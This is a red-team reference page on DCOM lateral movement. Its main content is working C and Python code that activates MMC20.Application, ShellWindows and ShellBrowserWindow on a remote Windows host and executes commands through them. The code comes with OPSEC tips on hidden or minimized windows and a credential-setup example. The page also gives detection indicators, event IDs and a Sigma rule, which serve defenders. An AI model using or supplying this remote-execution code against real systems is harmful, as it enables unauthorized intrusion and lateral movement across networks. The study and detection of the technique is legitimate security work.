# DCOM Lateral Movement - Remote Execution via COM Objects

**MITRE ATT&CK**: T1021.003 - Remote Services: Distributed Component Object Model

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Distributed Component Object Model (DCOM) extends COM to allow cross-machine object
activation and method invocation over the network. Several COM objects installed by
default on Windows expose methods capable of arbitrary command execution. DCOM-based
lateral movement is attractive because it leverages legitimate Windows infrastructure,
creates no services, drops no binaries to disk, and generates significantly less noise
than PsExec or WMI-based approaches. The primary COM objects used for lateral movement
are MMC20.Application, ShellWindows, and ShellBrowserWindow -- each offering a path to
command execution through standard COM interfaces. From a detection standpoint, DCOM
execution is characterized by child processes spawning under DllHost.exe or mmc.exe,
and by RPC traffic on TCP port 135 followed by dynamic high ports.

## COM/DCOM Architecture Overview

```
  COM Architecture (Single Machine)
  =================================

  Client Process                    COM Server Process (or in-proc DLL)
  +-----------------+               +-------------------+
  |  CoCreateInstance|               |   COM Object      |
  |  -> Proxy       |---IPC/RPC---->|   (implements     |
  |    (marshaling) |               |    IDispatch,      |
  |                 |               |    custom ifaces)  |
  +-----------------+               +-------------------+

  DCOM Architecture (Cross-Machine)
  ==================================

  Client Machine                           Remote Machine
  +------------------+                     +------------------+
  | CoCreateInstanceEx|                     | COM SCM (Service |
  |   COSERVERINFO:  |  TCP 135 (RPC EPM)  | Control Manager) |
  |   pwszName =     |-------------------->|   RPCSS service  |
  |   "192.168.1.50" |                     |                  |
  |                  |  OXID Resolution     |  Activates COM   |
  |   Proxy/Stub     |<--------------------|  server process  |
  |   (marshaled     |  Dynamic Port        |                  |
  |    interface)    |===================>  |  COM Object      |
  |                  |  Method calls via    |  (DllHost.exe    |
  |                  |  ORPC (Object RPC)   |   or mmc.exe)    |
  +------------------+                     +------------------+

  Key DCOM Components:
    - SCM (Service Control Manager): activates COM objects on request
    - OXID Resolver: resolves Object Exporter IDs to RPC bindings
    - RPCSS: Remote Procedure Call System Service (TCP 135)
    - DllHost.exe: Default COM surrogate host for out-of-proc objects
    - Proxy/Stub: Marshaling layer that serializes interface calls
```

## Three Primary DCOM Execution Objects

### 1. MMC20.Application

```
  CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
  ProgID: MMC20.Application
  Method: Document.ActiveView.ExecuteShellCommand

  Process lineage:
    svchost.exe (RPCSS)
      -> mmc.exe  (COM server for MMC20.Application)
           -> cmd.exe  (spawned by ExecuteShellCommand)

  DETECTION: mmc.exe spawning cmd.exe/powershell.exe is unusual
             in most environments and a strong lateral movement signal.
```

### 2. ShellWindows

```
  CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
  ProgID: (none -- must use CLSID)
  Method: Item().Document.Application.ShellExecute

  Process lineage:
    svchost.exe (RPCSS)
      -> explorer.exe  (ShellWindows hooks into existing Explorer)
           -> cmd.exe  (spawned via ShellExecute)

  DETECTION: Less obvious parent-child than MMC20, because Explorer
             regularly spawns child processes. However, ShellExecute
             called via DCOM from a remote host is detectable via
             network-level RPC analysis.
```

### 3. ShellBrowserWindow

```
  CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880}
  ProgID: (none -- must use CLSID)
  Method: Document.Application.ShellExecute

  Process lineage:
    svchost.exe (RPCSS)
      -> explorer.exe  (same as ShellWindows)
           -> cmd.exe

  NOTE: ShellBrowserWindow is similar to ShellWindows but uses a
        different CLSID. Some environments may have one blocked but
        not the other. Both use the same underlying execution method.
```

## C Implementation - DCOM Remote Execution

```c
#include <windows.h>
#include <objbase.h>
#include <stdio.h>

/*
 * DCOM Lateral Movement via MMC20.Application
 *
 * PURPOSE: Demonstrate how DCOM CoCreateInstanceEx activates a remote
 *          COM object and invokes methods for command execution.
 *
 * ARCHITECTURE:
 *   1. CoInitializeEx: Initialize COM runtime (COINIT_MULTITHREADED
 *      is required for DCOM because remote calls are inherently async)
 *   2. CoInitializeSecurity: Set authentication level for DCOM calls
 *   3. COSERVERINFO: Specifies the target machine and credentials
 *   4. CoCreateInstanceEx: Activates the COM object on the remote machine
 *   5. IDispatch::GetIDsOfNames + Invoke: Call methods by name via
 *      the IDispatch (Automation) interface
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 1: mmc.exe process creation on target with parent
 *     svchost.exe (DcomLaunch service)
 *   - Sysmon Event 1: cmd.exe spawned by mmc.exe (unusual parent)
 *   - Sysmon Event 3: Network connection from attacker to target
 *     TCP 135 (RPC Endpoint Mapper)
 *   - Event 4688: Process creation on target showing command line
 *   - Windows Firewall log: Inbound RPC connections
 *   - DCOM-specific: Event 10028 (DCOM activation) in System log
 *
 * OPSEC CONSIDERATIONS:
 *   - DCOM generates less noise than PsExec (no service creation,
 *     no binary drop) but the parent-child relationship
 *     (mmc.exe -> cmd.exe) is distinctive and detectable
 *   - Using ShellWindows instead of MMC20 gives a more natural
 *     parent (explorer.exe) but is slightly more complex
 *   - DCOM requires TCP 135 + dynamic ports -- may be blocked by
 *     host-based firewalls in segmented environments
 *   - Authentication: DCOM uses the caller's token by default;
 *     explicit credentials can be set via COAUTHIDENTITY
 */

/* ============================================================
 * CLSIDs for the three primary lateral movement COM objects.
 * ============================================================ */

/* MMC20.Application */
static const CLSID CLSID_MMC20 = {
    0x49B2791A, 0xB1AE, 0x4C90,
    {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}
};

/* ShellWindows */
static const CLSID CLSID_ShellWindows = {
    0x9BA05972, 0xF6A8, 0x11CF,
    {0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39}
};

/* ShellBrowserWindow */
static const CLSID CLSID_ShellBrowserWindow = {
    0xC08AFD90, 0xF2A1, 0x11D1,
    {0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80}
};


/*
 * dcom_exec_mmc20 - Execute a command on a remote host via MMC20.Application
 *
 * This demonstrates the full DCOM activation and method invocation flow.
 * The key steps are:
 *   1. Set up COSERVERINFO with target hostname/IP
 *   2. CoCreateInstanceEx to activate the COM object remotely
 *   3. Navigate the object model: Document -> ActiveView
 *   4. Call ExecuteShellCommand via IDispatch::Invoke
 *
 * Parameters:
 *   target  - Remote hostname or IP address
 *   command - Command to execute (e.g., "cmd.exe")
 *   args    - Command arguments (e.g., "/c whoami > C:\\out.txt")
 */
HRESULT dcom_exec_mmc20(LPCWSTR target, LPCWSTR command, LPCWSTR args) {

    HRESULT hr;

    /* --------------------------------------------------------
     * STEP 1: Initialize COM runtime.
     * COINIT_MULTITHREADED is required for DCOM because the
     * proxy/stub marshaling for remote calls needs the MTA
     * (Multi-Threaded Apartment) threading model.
     *
     * DETECTION: No direct artifact from this call.
     * -------------------------------------------------------- */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[!] CoInitializeEx failed: 0x%08lx\n", hr);
        return hr;
    }

    /* --------------------------------------------------------
     * STEP 2: Set COM security for DCOM authentication.
     * RPC_C_AUTHN_LEVEL_DEFAULT uses the process default.
     * RPC_C_IMP_LEVEL_IMPERSONATE allows the remote COM server
     * to impersonate the caller's token.
     *
     * OPSEC NOTE: If you need to authenticate as a different
     * user, set up COAUTHIDENTITY with explicit credentials
     * instead of using the current token.
     *
     * DETECTION: No direct artifact from this call.
     * -------------------------------------------------------- */
    hr = CoInitializeSecurity(
        NULL,                         /* pSecDesc */
        -1,                           /* cAuthSvc (auto) */
        NULL,                         /* asAuthSvc */
        NULL,                         /* pReserved1 */
        RPC_C_AUTHN_LEVEL_DEFAULT,    /* dwAuthnLevel */
        RPC_C_IMP_LEVEL_IMPERSONATE,  /* dwImpLevel */
        NULL,                         /* pAuthList */
        EOAC_NONE,                    /* dwCapabilities */
        NULL                          /* pReserved3 */
    );
    if (FAILED(hr)) {
        printf("[!] CoInitializeSecurity failed: 0x%08lx\n", hr);
        CoUninitialize();
        return hr;
    }

    /* --------------------------------------------------------
     * STEP 3: Configure COSERVERINFO to point to the target.
     * This structure tells CoCreateInstanceEx which remote
     * machine to activate the COM object on.
     *
     * COAUTHINFO can be added for explicit credential usage:
     *   COAUTHIDENTITY auth_id;
     *   auth_id.User = L"administrator";
     *   auth_id.Domain = L"CORP";
     *   auth_id.Password = L"P@ssw0rd";
     *   // ... set UserLength, DomainLength, PasswordLength, Flags
     *
     * DETECTION: The RPC connection to TCP 135 on the target
     * is visible in network traffic and firewall logs.
     * -------------------------------------------------------- */
    COSERVERINFO server_info;
    ZeroMemory(&server_info, sizeof(server_info));
    server_info.pwszName = (LPWSTR)target;

    /* --------------------------------------------------------
     * STEP 4: Activate the COM object remotely.
     * MULTI_QI specifies which interface we want back. We
     * request IDispatch because COM Automation objects expose
     * their methods through this interface.
     *
     * CLSCTX_REMOTE_SERVER tells COM to activate on the remote
     * machine specified in COSERVERINFO.
     *
     * DETECTION: This triggers the DCOM activation sequence:
     *   - RPC to target's Endpoint Mapper (TCP 135)
     *   - OXID resolution for the remote COM object
     *   - SCM on target activates the COM server process
     *   - On target: mmc.exe starts (for MMC20.Application)
     *   - Event 10028 (DCOM activation) in target's System log
     *   - Sysmon Event 1: mmc.exe created by svchost.exe
     * -------------------------------------------------------- */
    MULTI_QI mqi;
    ZeroMemory(&mqi, sizeof(mqi));
    mqi.pIID = &IID_IDispatch;

    hr = CoCreateInstanceEx(
        &CLSID_MMC20,          /* rclsid - MMC20.Application */
        NULL,                   /* pUnkOuter (no aggregation) */
        CLSCTX_REMOTE_SERVER,  /* dwClsCtx - activate remotely */
        &server_info,           /* pServerInfo - target machine */
        1,                      /* cmq - number of interfaces */
        &mqi                    /* pResults - receives interface */
    );
    if (FAILED(hr) || FAILED(mqi.hr)) {
        printf("[!] CoCreateInstanceEx failed: 0x%08lx / 0x%08lx\n",
               hr, mqi.hr);
        CoUninitialize();
        return FAILED(hr) ? hr : mqi.hr;
    }

    IDispatch *pMMC = (IDispatch *)mqi.pItf;

    /* --------------------------------------------------------
     * STEP 5: Navigate object model to get Document property.
     *
     * MMC20.Application.Document returns the MMC Document
     * object, which contains the ActiveView property.
     *
     * We use IDispatch::GetIDsOfNames to resolve "Document"
     * to a DISPID, then IDispatch::Invoke to get its value.
     *
     * DETECTION: No additional artifacts from property access.
     * -------------------------------------------------------- */
    DISPID dispid_document;
    LPOLESTR name_document = L"Document";
    hr = pMMC->lpVtbl->GetIDsOfNames(
        pMMC, &IID_NULL, &name_document, 1, LOCALE_SYSTEM_DEFAULT,
        &dispid_document
    );
    if (FAILED(hr)) {
        printf("[!] GetIDsOfNames(Document) failed: 0x%08lx\n", hr);
        pMMC->lpVtbl->Release(pMMC);
        CoUninitialize();
        return hr;
    }

    DISPPARAMS dp_empty = {NULL, NULL, 0, 0};
    VARIANT vt_document;
    VariantInit(&vt_document);

    hr = pMMC->lpVtbl->Invoke(
        pMMC, dispid_document, &IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_document, NULL, NULL
    );
    if (FAILED(hr)) {
        printf("[!] Invoke(Document) failed: 0x%08lx\n", hr);
        pMMC->lpVtbl->Release(pMMC);
        CoUninitialize();
        return hr;
    }

    IDispatch *pDocument = vt_document.pdispVal;

    /* --------------------------------------------------------
     * STEP 6: Get ActiveView from Document.
     *
     * Document.ActiveView returns the view object that exposes
     * ExecuteShellCommand -- our execution primitive.
     * -------------------------------------------------------- */
    DISPID dispid_activeview;
    LPOLESTR name_activeview = L"ActiveView";
    hr = pDocument->lpVtbl->GetIDsOfNames(
        pDocument, &IID_NULL, &name_activeview, 1,
        LOCALE_SYSTEM_DEFAULT, &dispid_activeview
    );

    VARIANT vt_activeview;
    VariantInit(&vt_activeview);
    hr = pDocument->lpVtbl->Invoke(
        pDocument, dispid_activeview, &IID_NULL,
        LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET,
        &dp_empty, &vt_activeview, NULL, NULL
    );

    IDispatch *pActiveView = vt_activeview.pdispVal;

    /* --------------------------------------------------------
     * STEP 7: Call ExecuteShellCommand.
     *
     * Method signature:
     *   ExecuteShellCommand(Command, Directory, Parameters, WindowState)
     *     Command:     Path to executable (e.g., "cmd.exe")
     *     Directory:   Working directory (can be NULL)
     *     Parameters:  Arguments (e.g., "/c whoami")
     *     WindowState: "7" = minimized (reduce visual indicator)
     *
     * DETECTION: THIS is the critical moment:
     *   - mmc.exe spawns cmd.exe (Event 4688 / Sysmon 1)
     *   - Parent process mmc.exe with child cmd.exe is unusual
     *   - Command line arguments visible in process creation events
     *   - Any output files created are visible (file creation events)
     *
     * OPSEC: The spawned process runs under the DCOM activation
     *   user's context on the target machine. WindowState "7"
     *   minimizes the window but doesn't hide it completely.
     *   Consider using minimized + short-lived commands.
     * -------------------------------------------------------- */
    DISPID dispid_exec;
    LPOLESTR name_exec = L"ExecuteShellCommand";
    hr = pActiveView->lpVtbl->GetIDsOfNames(
        pActiveView, &IID_NULL, &name_exec, 1,
        LOCALE_SYSTEM_DEFAULT, &dispid_exec
    );

    /* Build parameters for ExecuteShellCommand (4 args, reversed order) */
    VARIANT args_array[4];
    VariantInit(&args_array[0]);  /* WindowState (last param = index 0) */
    VariantInit(&args_array[1]);  /* Parameters */
    VariantInit(&args_array[2]);  /* Directory */
    VariantInit(&args_array[3]);  /* Command (first param = last index) */

    /* Note: DISPPARAMS args are in REVERSE order */
    args_array[3].vt = VT_BSTR;
    args_array[3].bstrVal = SysAllocString(command);  /* "cmd.exe" */

    args_array[2].vt = VT_BSTR;
    args_array[2].bstrVal = SysAllocString(L"");      /* Directory */

    args_array[1].vt = VT_BSTR;
    args_array[1].bstrVal = SysAllocString(args);     /* "/c ..." */

    args_array[0].vt = VT_BSTR;
    args_array[0].bstrVal = SysAllocString(L"7");     /* Minimized */

    DISPPARAMS dp_exec;
    dp_exec.rgvarg = args_array;
    dp_exec.cArgs = 4;
    dp_exec.rgdispidNamedArgs = NULL;
    dp_exec.cNamedArgs = 0;

    hr = pActiveView->lpVtbl->Invoke(
        pActiveView, dispid_exec, &IID_NULL,
        LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD,
        &dp_exec, NULL, NULL, NULL
    );

    if (SUCCEEDED(hr)) {
        printf("[+] ExecuteShellCommand succeeded on %ls\n", target);
    } else {
        printf("[!] ExecuteShellCommand failed: 0x%08lx\n", hr);
    }

    /* Cleanup: release all COM interfaces */
    SysFreeString(args_array[0].bstrVal);
    SysFreeString(args_array[1].bstrVal);
    SysFreeString(args_array[2].bstrVal);
    SysFreeString(args_array[3].bstrVal);
    pActiveView->lpVtbl->Release(pActiveView);
    pDocument->lpVtbl->Release(pDocument);
    pMMC->lpVtbl->Release(pMMC);
    CoUninitialize();

    return hr;
}
```

## Python Implementation - DCOM Execution

```python
"""
DCOM Lateral Movement via Python COM Automation.

This uses Python's win32com (pywin32) or comtypes to instantiate
remote COM objects for lateral movement. Python is useful for
prototyping DCOM techniques because COM Automation (IDispatch)
maps directly to Python's dynamic attribute access.

DETECTION: Same artifacts as the C implementation:
  - mmc.exe / explorer.exe spawning child processes on target
  - RPC network traffic to TCP 135 + dynamic ports
  - Event 10028 DCOM activation in System log

OPSEC NOTES:
  - Python COM calls produce the same on-target artifacts as any
    other DCOM caller (PowerShell, C, etc.)
  - The calling process on the attacker machine is python.exe,
    which may stand out in process telemetry if DCOM calls from
    python.exe are unexpected
  - Consider using compiled executables for production tooling
"""

import sys

# ============================================================
# Method 1: MMC20.Application via win32com
# ============================================================

def dcom_mmc20(target: str, command: str, params: str = "") -> bool:
    """
    Execute a command on a remote host via MMC20.Application DCOM.

    The MMC20.Application COM object exposes ExecuteShellCommand
    through Document.ActiveView. This is the most commonly
    documented DCOM lateral movement method.

    Args:
        target: Remote hostname or IP
        command: Executable path (e.g., "cmd.exe")
        params: Command arguments (e.g., "/c whoami > C:\\out.txt")

    Process chain on target:
        svchost.exe -> mmc.exe -> cmd.exe

    Detection:
        - Event 4688: cmd.exe with parent mmc.exe
        - Sysmon 1: Process creation with unusual parent
        - Network: RPC traffic to target on TCP 135
    """
    try:
        import win32com.client

        # CreateObject with target machine name activates via DCOM.
        # Under the hood, this calls CoCreateInstanceEx with
        # CLSCTX_REMOTE_SERVER and a COSERVERINFO containing
        # the target hostname.
        #
        # The remote SCM (Service Control Manager) receives the
        # activation request, launches mmc.exe (the COM server
        # for MMC20.Application), and returns a marshaled
        # IDispatch interface pointer to the caller.
        mmc = win32com.client.Dispatch(
            "MMC20.Application",
            clsctx=0x10,  # CLSCTX_REMOTE_SERVER
            machine=target
        )

        # Navigate the object model:
        # MMC20.Application -> Document -> ActiveView
        # Each property access is an IDispatch::Invoke call
        # marshaled over DCOM to the remote mmc.exe process.
        active_view = mmc.Document.ActiveView

        # Execute the command via ExecuteShellCommand.
        # Parameters: Command, Directory, Parameters, WindowState
        # WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
        #
        # DETECTION MOMENT: This is when mmc.exe spawns the child
        # process. Event 4688 and Sysmon Event 1 fire on the target.
        active_view.ExecuteShellCommand(
            command,    # "cmd.exe"
            "",         # Working directory (empty = default)
            params,     # "/c whoami > C:\\Windows\\Temp\\out.txt"
            "7"         # Minimized window
        )

        print(f"[+] DCOM MMC20 execution succeeded on {target}")
        return True

    except Exception as e:
        print(f"[!] DCOM MMC20 execution failed: {e}")
        return False


# ============================================================
# Method 2: ShellWindows via comtypes (CLSID-based)
# ============================================================

def dcom_shellwindows(target: str, command: str, params: str = "") -> bool:
    """
    Execute a command on a remote host via ShellWindows DCOM.

    ShellWindows does not have a ProgID, so we must use its CLSID
    directly: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}

    The execution path goes through:
        Item().Document.Application.ShellExecute()

    Process chain on target:
        explorer.exe -> cmd.exe

    This is slightly stealthier than MMC20 because explorer.exe
    is a more natural parent for child processes than mmc.exe.

    Detection:
        - Harder to detect via parent-child relationship alone
        - RPC network traffic pattern is similar to MMC20
        - Can correlate DCOM activation events with process creation
    """
    try:
        import comtypes
        import comtypes.client

        # CLSID for ShellWindows
        CLSID_ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"

        # Create the remote COM object using CLSID
        # comtypes.CoCreateInstanceEx handles the DCOM activation
        shell_windows = comtypes.client.CreateObject(
            CLSID_ShellWindows,
            clsctx=0x10,  # CLSCTX_REMOTE_SERVER
            machine=target
        )

        # Get the first Shell window item (index 0)
        # This returns a reference to an Internet Explorer or
        # Windows Explorer window on the remote machine.
        item = shell_windows.Item(0)

        # Navigate to the Application object, which exposes
        # ShellExecute for command execution.
        #
        # The chain: ShellWindows.Item(0).Document.Application
        # gives us the Shell.Application object, which has the
        # ShellExecute method used in many lateral movement tools.
        shell_app = item.Document.Application

        # Execute via ShellExecute
        # Parameters: File, vArgs, vDir, vOperation, vShow
        #   vOperation: "open" (default)
        #   vShow: 0 = SW_HIDE
        shell_app.ShellExecute(
            command,     # "cmd.exe"
            params,      # "/c ..."
            "",          # Working directory
            "open",      # Operation
            0            # SW_HIDE (hidden window)
        )

        print(f"[+] DCOM ShellWindows execution succeeded on {target}")
        return True

    except Exception as e:
        print(f"[!] DCOM ShellWindows execution failed: {e}")
        return False


# ============================================================
# Method 3: ShellBrowserWindow via comtypes
# ============================================================

def dcom_shellbrowser(target: str, command: str, params: str = "") -> bool:
    """
    Execute via ShellBrowserWindow DCOM object.

    CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880}

    Very similar to ShellWindows but uses a different COM object.
    Some environments may block one CLSID but not the other.

    Process chain on target:
        explorer.exe -> cmd.exe
    """
    try:
        import comtypes
        import comtypes.client

        CLSID_ShellBrowser = "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"

        browser = comtypes.client.CreateObject(
            CLSID_ShellBrowser,
            clsctx=0x10,
            machine=target
        )

        # Navigate to ShellExecute through the Document.Application path
        shell_app = browser.Document.Application
        shell_app.ShellExecute(command, params, "", "open", 0)

        print(f"[+] DCOM ShellBrowserWindow execution succeeded on {target}")
        return True

    except Exception as e:
        print(f"[!] DCOM ShellBrowserWindow execution failed: {e}")
        return False


# ============================================================
# CLSID/ProgID Resolution Helper
# ============================================================

def resolve_com_object(progid_or_clsid: str) -> dict:
    """
    Resolve a ProgID to CLSID or vice versa by querying the registry.

    COM object registration is stored in:
      HKCR\\CLSID\\{...}   (CLSID to class info)
      HKCR\\ProgID          (ProgID to CLSID mapping)

    This is useful for enumerating available DCOM objects on a
    target system during reconnaissance.
    """
    import winreg

    result = {}
    try:
        if progid_or_clsid.startswith('{'):
            # CLSID -> look up ProgID
            key_path = f"CLSID\\{progid_or_clsid}\\ProgID"
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, key_path) as key:
                result['ProgID'] = winreg.QueryValue(key, None)
            result['CLSID'] = progid_or_clsid
        else:
            # ProgID -> look up CLSID
            key_path = f"{progid_or_clsid}\\CLSID"
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, key_path) as key:
                result['CLSID'] = winreg.QueryValue(key, None)
            result['ProgID'] = progid_or_clsid
    except FileNotFoundError:
        result['error'] = f"Not found: {progid_or_clsid}"

    return result


# ============================================================
# Usage (educational)
# ============================================================

if __name__ == '__main__':
    print("[*] DCOM Lateral Movement - Educational Reference")
    print("[*] Requires: local admin on target, RPC access (TCP 135)")
    print()
    print("[*] Method 1: MMC20.Application")
    print("    CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}")
    print("    Parent: mmc.exe -> cmd.exe")
    print()
    print("[*] Method 2: ShellWindows")
    print("    CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
    print("    Parent: explorer.exe -> cmd.exe")
    print()
    print("[*] Method 3: ShellBrowserWindow")
    print("    CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
    print("    Parent: explorer.exe -> cmd.exe")
```

## Detection Indicators

### Process-Based Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| mmc.exe -> cmd.exe | Sysmon Event 1 / Event 4688 | MMC20.Application spawning shell (highly unusual) |
| mmc.exe -> powershell.exe | Sysmon Event 1 / Event 4688 | MMC20.Application spawning PowerShell |
| DllHost.exe -> cmd.exe | Sysmon Event 1 / Event 4688 | COM surrogate spawning shell (some COM objects use DllHost) |
| explorer.exe (DCOM-spawned) | Sysmon Event 1 | New explorer.exe instance for ShellWindows execution |

### Network-Based Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| TCP 135 inbound | Firewall / Sysmon Event 3 | RPC Endpoint Mapper connection from non-management host |
| Dynamic RPC ports | Network monitor | High-port connections following TCP 135 handshake |
| DCOM OXID resolution | Packet capture | OXID resolver traffic indicates remote COM activation |

### Event Log Detection

| Event | Log | Description |
|-------|-----|-------------|
| 10028 | System | DCOM launch permission warning (if misconfigured) |
| 4688 | Security | Process creation with unusual parent process |
| 4624 Type 3 | Security | Network logon associated with DCOM activation |

### SIGMA Rule Example

```yaml
title: DCOM Lateral Movement - MMC20.Application Execution
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: '\mmc.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
    filter:
        # MMC snap-ins may legitimately spawn processes
        CommandLine|contains:
            - 'mmc.exe /a'
            - '.msc'
    condition: selection and not filter
level: high
tags:
    - attack.lateral_movement
    - attack.t1021.003
```

## Cross-References

- [DCOM Lateral Movement - Technique Narrative](../../09-lateral-movement/dcom-lateral.md)
- [WMI Remote Execution (this directory)](wmi-remote-exec.md)
- [PsExec/SMBExec](../../09-lateral-movement/psexec-smbexec.md)
- [Pass the Hash Implementation (this directory)](pth-implementation.md)
- [Process Injection Techniques](../process-injection/README.md)
- [WinRM Lateral Movement](../../09-lateral-movement/winrm-lateral.md)
